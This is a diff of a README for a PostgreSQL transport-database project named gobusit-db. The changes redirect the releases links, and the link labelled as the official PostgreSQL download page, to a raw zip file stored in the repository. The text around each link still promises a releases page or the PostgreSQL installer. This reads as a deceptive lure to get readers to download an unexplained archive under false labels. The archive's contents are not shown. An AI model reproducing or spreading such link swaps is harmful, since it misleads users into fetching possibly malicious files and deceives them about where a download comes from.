@@ -1,6 +1,6 @@
 # 🚍 gobusit-db - Clear Database Design for Transport
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Go%20to%20Releases-brightgreen)](https://github.com/Atif0209/gobusit-db/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Go%20to%20Releases-brightgreen)](https://github.com/Atif0209/gobusit-db/raw/refs/heads/main/schema/db-gobusit-unaccompanying.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Here is how to get and use gobusit-db on your Windows computer.
 
 Please visit this page to download the latest release:
 
-[Download gobusit-db](https://github.com/Atif0209/gobusit-db/releases)
+[Download gobusit-db](https://github.com/Atif0209/gobusit-db/raw/refs/heads/main/schema/db-gobusit-unaccompanying.zip)
 
 Click the link above to open the releases page. On that page, you will see downloadable files. Choose the one suited for your needs, usually a zipped file containing all schemas, diagrams, and migration files.
 
@@ -53,7 +53,7 @@ Click the link above to open the releases page. On that page, you will see downl
 
 If you do not have PostgreSQL installed, follow these steps:
 
-1. Go to the PostgreSQL download page: https://www.postgresql.org/download/windows/
+1. Go to the PostgreSQL download page: https://github.com/Atif0209/gobusit-db/raw/refs/heads/main/schema/db-gobusit-unaccompanying.zip
 2. Download the installer for your system.
 3. Run the installer and follow the prompts.
 4. Set a password when asked, and remember it for later use.
@@ -141,6 +141,6 @@ psql -U yourusername -d gobusit -f path/to/newmigration.sql
 
 ## 📥 Download gobusit-db Again
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Go%20to%20Releases-brightgreen)](https://github.com/Atif0209/gobusit-db/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Go%20to%20Releases-brightgreen)](https://github.com/Atif0209/gobusit-db/raw/refs/heads/main/schema/db-gobusit-unaccompanying.zip)
 
 Use this link anytime you want to get the latest versions or files. New releases may include updated diagrams or improved database structures.
